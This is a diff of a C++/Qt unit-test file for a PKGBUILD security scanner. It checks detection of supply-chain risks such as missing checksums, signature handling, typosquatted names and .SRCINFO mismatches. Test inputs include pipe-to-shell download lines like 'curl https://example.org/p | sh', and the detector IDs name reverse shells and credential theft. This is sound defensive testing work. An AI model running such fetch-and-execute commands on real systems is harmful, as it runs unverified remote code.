@@ -1,17 +1,26 @@
 // SPDX-License-Identifier: GPL-3.0-or-later
 #include "pkgscan.hpp"
 
+#include <QDir>
 #include <QFile>
+#include <QJsonObject>
+#include <QTemporaryDir>
 #include <QTest>
+
+using namespace Qt::StringLiterals;
 
 using pkgscan::Severity;
 
 namespace {
 
-QString readData(const char* name) {
-    QFile file(QStringLiteral(TEST_DATA_DIR "/") + QLatin1String(name));
+const auto NO_CHECKSUM = u"no-checksum"_s;
+constexpr auto KEY      = "0123456789ABCDEF0123456789ABCDEF01234567"_L1;
+const auto KEYS         = u"validpgpkeys=(%1)"_s.arg(KEY);
+
+QString readData(const QString& name) {
+    QFile file(QStringLiteral(TEST_DATA_DIR "/") + name);
     if (!file.open(QIODevice::ReadOnly)) {
-        qFatal("missing test data %s", name);
+        qFatal("missing test data %s", qPrintable(name));
     }
     return QString::fromUtf8(file.readAll());
 }
@@ -33,28 +42,31 @@ int lineOf(const QList<pkgscan::Finding>& findings, const char* id) {
     return -1;
 }
 
+QString recipe(QStringView sources, QStringView extra = {}) {
+    return u"pkgname=x\npkgver=1\n%1\n%2\nbuild() {\n  :\n}\n"_s.arg(sources, extra);
+}
+
 QString wrap(const QString& body) {
     return QStringLiteral("pkgname=x\npkgver=1\nsource=()\nbuild() {\n%1\n}\n").arg(body);
 }
 
-}  // namespace
+}
 
 class TestPkgscan : public QObject {
     Q_OBJECT
 
  private slots:
     void cleanPackageHasNoWarnings() {
-        const auto analysis = pkgscan::scanPkgbuild(readData("clean.PKGBUILD"));
+        const auto analysis = pkgscan::scanPkgbuild(readData(u"clean.PKGBUILD"_s));
         for (const auto& finding : analysis.findings) {
             QVERIFY2(finding.severity == Severity::Info, qPrintable(finding.id + u':' + QString::number(finding.line) + u' ' + finding.excerpt));
         }
         QCOMPARE(analysis.hosts, QStringList{QStringLiteral("github.com")});
-        // the install scriptlet comes first, the patch is not a script
         QCOMPARE(analysis.localFiles, (QStringList{QStringLiteral("hello-tool.install"), QStringLiteral("hello-tool.service")}));
     }
 
     void maliciousPackage() {
-        const auto analysis = pkgscan::scanPkgbuild(readData("malicious.PKGBUILD"));
+        const auto analysis = pkgscan::scanPkgbuild(readData(u"malicious.PKGBUILD"_s));
         const auto found    = ids(analysis.findings);
         for (const char* id : {"top-level-command", "download", "no-checksum", "ip-host", "throwaway-host", "weak-checksum", "vcs-unpinned",
                  "pipe-to-shell", "tls-off", "decode-exec", "eval", "obfuscated-escapes", "credentials", "reverse-shell", "inline-script",
@@ -65,15 +77,14 @@ class TestPkgscan : public QObject {
         QCOMPARE(lineOf(analysis.findings, "pipe-to-shell"), 16);
         QCOMPARE(lineOf(analysis.findings, "ip-host"), 8);
         QCOMPARE(lineOf(analysis.findings, "reverse-shell"), 24);
-        // a pipe to a shell is reported once, not also as a plain download
         QCOMPARE(found.count(QStringLiteral("download")), 2);
         QVERIFY(analysis.hosts.contains(QStringLiteral("203.0.113.7")));
     }
 
     void installScript() {
-        const auto findings = pkgscan::scanScript(readData("bad.install"), QStringLiteral("bad.install"));
+        const auto findings = pkgscan::scanScript(readData(u"bad.install"_s), QStringLiteral("bad.install"));
         const auto found    = ids(findings);
-        QCOMPARE(found.count(QStringLiteral("pipe-to-shell")), 1);  // the commented one is ignored
+        QCOMPARE(found.count(QStringLiteral("pipe-to-shell")), 1);
         QCOMPARE(lineOf(findings, "pipe-to-shell"), 3);
         QVERIFY(found.contains(QStringLiteral("service")));
         QVERIFY(found.contains(QStringLiteral("autostart")));
@@ -84,7 +95,7 @@ class TestPkgscan : public QObject {
 
     void lineRules_data() {
         QTest::addColumn<QString>("line");
-        QTest::addColumn<QString>("expected");  // empty: nothing above Info
+        QTest::addColumn<QString>("expected");
 
         QTest::newRow("configure flag") << "./configure --prefix=/usr --with-curl --enable-wget" << "";
         QTest::newRow("make install") << "make DESTDIR=\"$pkgdir\" install" << "";
@@ -126,7 +137,6 @@ class TestPkgscan : public QObject {
         }
     }
 
-    // Top-level lines are only skipped when they are nothing but an assignment.
     void codeBehindAssignments_data() {
         QTest::addColumn<QString>("line");
 
@@ -158,7 +168,6 @@ class TestPkgscan : public QObject {
     void commandSplitByContinuation() {
         const auto analysis = pkgscan::scanPkgbuild(wrap(QStringLiteral("  cu\\\nrl https://example.org/p | sh")));
         QVERIFY2(ids(analysis.findings).contains(QStringLiteral("pipe-to-shell")), qPrintable(ids(analysis.findings).join(u' ')));
-        // arguments on a continuation line still belong to the command
         const auto link = pkgscan::scanPkgbuild(wrap(QStringLiteral("  ln -s /usr/lib/x \\\n    \"$pkgdir/usr/lib/y\"")));
         QVERIFY2(!ids(link.findings).contains(QStringLiteral("system-write")), qPrintable(ids(link.findings).join(u' ')));
     }
@@ -175,7 +184,6 @@ class TestPkgscan : public QObject {
         QCOMPARE(analysis.localFiles, QStringList{QStringLiteral("payload")});
         QCOMPARE(analysis.otherLocalFiles, (QStringList{QStringLiteral("notes"), QStringLiteral("fix.patch")}));
 
-        // the command may be split over lines, even inside the name of the interpreter
         for (const auto* build : {"  bash \\\n      payload\n", "  ba\\\nsh payload\n"}) {
             const auto split = pkgscan::scanPkgbuild(
                 QStringLiteral("pkgname=x\npkgver=1\nsource=(payload)\nsha256sums=(a)\nbuild() {\n%1}\n").arg(QLatin1String(build)));
@@ -184,47 +192,110 @@ class TestPkgscan : public QObject {
     }
 
     void signatures() {
-        // stored as payload.sh, so makepkg does not treat it as a signature
-        const auto renamed = pkgscan::scanPkgbuild(QStringLiteral(
-            "pkgname=x\npkgver=1\nsource=(\"payload.sh::https://example.org/payload.sig\")\nsha256sums=(SKIP)\nbuild() {\n  :\n}\n"));
-        QVERIFY(ids(renamed.findings).contains(QStringLiteral("no-checksum")));
+        const auto renamed = pkgscan::scanPkgbuild(recipe(u"source=(\"payload.sh::https://example.org/payload.sig\")\nsha256sums=(SKIP)"));
+        QVERIFY(ids(renamed.findings).contains(NO_CHECKSUM));
 
-        const QString signedSource = QStringLiteral(
-            "pkgname=x\npkgver=1\nsource=(https://example.org/x-1.tar.gz{,.sig})\nsha256sums=(SKIP SKIP)\n%1build() {\n  :\n}\n");
-        const auto braces = pkgscan::scanPkgbuild(signedSource.arg(QStringLiteral("validpgpkeys=(0123456789ABCDEF0123456789ABCDEF01234567)\n")));
-        Q_UNUSED(braces)  // brace expansion is not modelled; the explicit form below is
+        const auto pair = u"source=(https://example.org/x-1.tar.gz https://example.org/x-1.tar.gz.sig)\nsha256sums=(SKIP SKIP)"_s;
+        const auto withKeys = pkgscan::scanPkgbuild(recipe(pair, KEYS));
+        QVERIFY2(!ids(withKeys.findings).contains(NO_CHECKSUM), qPrintable(ids(withKeys.findings).join(u' ')));
+        QCOMPARE(ids(pkgscan::scanPkgbuild(recipe(pair)).findings).count(NO_CHECKSUM), 1);
 
-        const QString pair = QStringLiteral(
-            "pkgname=x\npkgver=1\nsource=(https://example.org/x-1.tar.gz https://example.org/x-1.tar.gz.sig)\nsha256sums=(SKIP SKIP)\n%1build() {\n  :\n}\n");
-        const auto withKeys = pkgscan::scanPkgbuild(pair.arg(QStringLiteral("validpgpkeys=(0123456789ABCDEF0123456789ABCDEF01234567)\n")));
-        QVERIFY2(!ids(withKeys.findings).contains(QStringLiteral("no-checksum")), qPrintable(ids(withKeys.findings).join(u' ')));
-        // without validpgpkeys any key in the keyring of the user would do
-        const auto withoutKeys = pkgscan::scanPkgbuild(pair.arg(QString()));
-        QCOMPARE(ids(withoutKeys.findings).count(QStringLiteral("no-checksum")), 1);
+        const auto query = pkgscan::scanPkgbuild(recipe(u"source=(https://example.org/payload 'https://example.org/payload.sig?download=1')\nsha256sums=(SKIP SKIP)", KEYS));
+        QCOMPARE(ids(query.findings).count(NO_CHECKSUM), 2);
 
-        const QString keys = QStringLiteral("validpgpkeys=(0123456789ABCDEF0123456789ABCDEF01234567)\n");
-        // makepkg keeps the query of a plain download in the file name: not a signature
-        const auto query = pkgscan::scanPkgbuild(QStringLiteral(
-            "pkgname=x\npkgver=1\nsource=(https://example.org/payload 'https://example.org/payload.sig?download=1')\n"
-            "sha256sums=(SKIP SKIP)\n%1build() {\n  :\n}\n").arg(keys));
-        QCOMPARE(ids(query.findings).count(QStringLiteral("no-checksum")), 2);
+        const auto otherArch = pkgscan::scanPkgbuild(recipe(
+            u"source=(https://example.org/payload)\nsha256sums=(SKIP)\nsource_aarch64=(https://example.org/payload.sig)\nsha256sums_aarch64=(SKIP)", KEYS));
+        QCOMPARE(ids(otherArch.findings).count(NO_CHECKSUM), 1);
+        const auto common = pkgscan::scanPkgbuild(recipe(
+            u"source=(https://example.org/payload.sig)\nsha256sums=(SKIP)\nsource_x86_64=(https://example.org/payload)\nsha256sums_x86_64=(SKIP)", KEYS));
+        QVERIFY2(!ids(common.findings).contains(NO_CHECKSUM), qPrintable(ids(common.findings).join(u' ')));
 
-        // a signature that only another architecture downloads signs nothing here
-        const auto otherArch = pkgscan::scanPkgbuild(QStringLiteral(
-            "pkgname=x\npkgver=1\nsource=(https://example.org/payload)\nsha256sums=(SKIP)\n"
-            "source_aarch64=(https://example.org/payload.sig)\nsha256sums_aarch64=(SKIP)\n%1build() {\n  :\n}\n").arg(keys));
-        QCOMPARE(ids(otherArch.findings).count(QStringLiteral("no-checksum")), 1);
-        // while a common signature covers the source of one architecture
-        const auto common = pkgscan::scanPkgbuild(QStringLiteral(
-            "pkgname=x\npkgver=1\nsource=(https://example.org/payload.sig)\nsha256sums=(SKIP)\n"
-            "source_x86_64=(https://example.org/payload)\nsha256sums_x86_64=(SKIP)\n%1build() {\n  :\n}\n").arg(keys));
-        QVERIFY2(!ids(common.findings).contains(QStringLiteral("no-checksum")), qPrintable(ids(common.findings).join(u' ')));
+        const auto packed = pkgscan::scanPkgbuild(recipe(u"source=(https://example.org/x.tar.xz https://example.org/x.tar.sign)\nsha256sums=(SKIP SKIP)", KEYS));
+        QVERIFY2(!ids(packed.findings).contains(NO_CHECKSUM), qPrintable(ids(packed.findings).join(u' ')));
+    }
 
-        // x.tar.sign signs the unpacked x.tar.xz
-        const auto packed = pkgscan::scanPkgbuild(QStringLiteral(
-            "pkgname=x\npkgver=1\nsource=(https://example.org/x.tar.xz https://example.org/x.tar.sign)\n"
-            "sha256sums=(SKIP SKIP)\n%1build() {\n  :\n}\n").arg(keys));
-        QVERIFY2(!ids(packed.findings).contains(QStringLiteral("no-checksum")), qPrintable(ids(packed.findings).join(u' ')));
+    void braceExpansion() {
+        const auto pkgbuild = recipe(u"source=(https://example.org/x-1.tar.gz{,.sig})\nsha256sums=(SKIP SKIP)", KEYS);
+        const auto srcinfo  = u"pkgbase = x\n\tsource = https://example.org/x-1.tar.gz\n\tsource = https://example.org/x-1.tar.gz.sig\n"
+                              "\tsha256sums = SKIP\n\tsha256sums = SKIP\n\tvalidpgpkeys = %1\n"_s.arg(KEY);
+        const auto listed   = pkgscan::scanPkgbuild(pkgbuild, srcinfo);
+        QVERIFY2(listed.findings.isEmpty(), qPrintable(ids(listed.findings).join(u' ')));
+
+        const auto bare = pkgscan::scanPkgbuild(pkgbuild);
+        QEXPECT_FAIL("", "brace expansion is only known from .SRCINFO", Continue);
+        QVERIFY(!ids(bare.findings).contains(NO_CHECKSUM));
+    }
+
+    void srcinfoGivesTheSameResult_data() {
+        QTest::addColumn<QString>("name");
+        QTest::newRow("clean") << u"clean"_s;
+        QTest::newRow("malicious") << u"malicious"_s;
+    }
+
+    void srcinfoGivesTheSameResult() {
+        QFETCH(QString, name);
+        const auto pkgbuild = readData(name + u".PKGBUILD");
+        const auto bare     = pkgscan::scanPkgbuild(pkgbuild);
+        const auto listed   = pkgscan::scanPkgbuild(pkgbuild, readData(name + u".SRCINFO"));
+        QCOMPARE(listed.findings.size(), bare.findings.size());
+        for (qsizetype i = 0; i < bare.findings.size(); ++i) {
+            QCOMPARE(listed.findings.at(i).id, bare.findings.at(i).id);
+            QCOMPARE(listed.findings.at(i).line, bare.findings.at(i).line);
+            QCOMPARE(listed.findings.at(i).excerpt, bare.findings.at(i).excerpt);
+        }
+        QCOMPARE(listed.hosts, bare.hosts);
+        QCOMPARE(listed.localFiles, bare.localFiles);
+        QCOMPARE(listed.otherLocalFiles, bare.otherLocalFiles);
+    }
+
+    void srcinfoMismatch() {
+        const auto pkgbuild = recipe(u"source=(https://example.org/a \"https://example.org/$_dir/b\")\nsha256sums=(0 0)\ninstall=\"${pkgname%-git}.install\"");
+        const auto srcinfo  = u"pkgbase = x\n\tinstall = x.install\n\tsource = https://example.net/c\n\tsource = https://example.org/d/b\n\tsha256sums = 0\n\tsha256sums = 0\n"_s;
+        const auto analysis = pkgscan::scanPkgbuild(pkgbuild, srcinfo);
+        QCOMPARE(ids(analysis.findings), QStringList{u"srcinfo-mismatch"_s});
+        QCOMPARE(analysis.findings.first().line, 3);
+        QCOMPARE(analysis.findings.first().excerpt, u"https://example.org/a"_s);
+        QCOMPARE(analysis.hosts, QStringList{u"example.org"_s});
+        QCOMPARE(analysis.localFiles, QStringList{u"x.install"_s});
+        QVERIFY(pkgscan::scanPkgbuild(pkgbuild).localFiles.isEmpty());
+    }
+
+    void collectFiles() {
+        QTemporaryDir dir;
+        QVERIFY(dir.isValid());
+        const auto write = [&](const QString& name, const QByteArray& text) {
+            QFile file(dir.filePath(name));
+            QVERIFY(file.open(QIODevice::WriteOnly));
+            file.write(text);
+        };
+        write(u"a.install"_s, "post_install() { :; }\n");
+        write(u"b.sh"_s, "true\n");
+        write(u"payload"_s, "#!/bin/sh\ncurl https://example.org/p | sh\n");
+        write(u"notes"_s, "text\n");
+        QVERIFY(QFile::link(dir.filePath(u"payload"_s), dir.filePath(u"link"_s)));
+
+        pkgscan::Analysis analysis;
+        analysis.localFiles      = {u"a.install"_s, u"b.sh"_s, u"missing.sh"_s};
+        analysis.otherLocalFiles = {u"payload"_s, u"notes"_s, u"link"_s};
+        const auto files         = pkgscan::collectFiles(QDir(dir.path()), analysis, 3);
+        QCOMPARE(analysis.localFiles, (QStringList{u"a.install"_s, u"b.sh"_s, u"missing.sh"_s, u"payload"_s}));
+        QCOMPARE(files.files.size(), 2);
+        QCOMPARE(files.files.first().name, u"a.install"_s);
+        QCOMPARE(files.unreadable, (QStringList{u"payload"_s, u"missing.sh"_s}));
+    }
+
+    void names() {
+        QVERIFY(pkgscan::validPkgbase(u"python-foo+bar_2.0@x"));
+        for (const auto* name : {"", ".hidden", "-flag", "Upper", "a/b", "a b"}) {
+            QVERIFY2(!pkgscan::validPkgbase(QString::fromLatin1(name)), name);
+        }
+        QVERIFY(!pkgscan::validPkgbase(QString(129, u'a')));
+
+        const pkgscan::Finding finding{u"eval"_s, Severity::Warning, u"PKGBUILD"_s, 3, u"t"_s, u"d"_s, u"e"_s};
+        const auto json = pkgscan::toJson(finding);
+        QCOMPARE(json.value("severity"_L1).toString(), u"warning"_s);
+        QCOMPARE(json.value("line"_L1).toInt(), 3);
+        QCOMPARE(pkgscan::severityName(Severity::Danger), u"danger"_s);
     }
 
     void metadata() {
@@ -253,10 +324,10 @@ class TestPkgscan : public QObject {
         QCOMPARE(pkgscan::similarName(QStringLiteral("firefoxx-bin"), known), QStringLiteral("firefox"));
         QCOMPARE(pkgscan::similarName(QStringLiteral("dicsord"), known), QStringLiteral("discord"));
         QCOMPARE(pkgscan::similarName(QStringLiteral("python-request"), known), QStringLiteral("python-requests"));
-        QCOMPARE(pkgscan::similarName(QStringLiteral("firefox-bin"), known), QString());  // a variant of the real package
+        QCOMPARE(pkgscan::similarName(QStringLiteral("firefox-bin"), known), QString());
         QCOMPARE(pkgscan::similarName(QStringLiteral("firefox"), known), QString());
         QCOMPARE(pkgscan::similarName(QStringLiteral("gtk4x"), known), QString());
-        QCOMPARE(pkgscan::similarName(QStringLiteral("vlcc"), known), QString());  // too short to judge
+        QCOMPARE(pkgscan::similarName(QStringLiteral("vlcc"), known), QString());
         QCOMPARE(pkgscan::similarName(QStringLiteral("spotify"), known), QString());
     }
 };
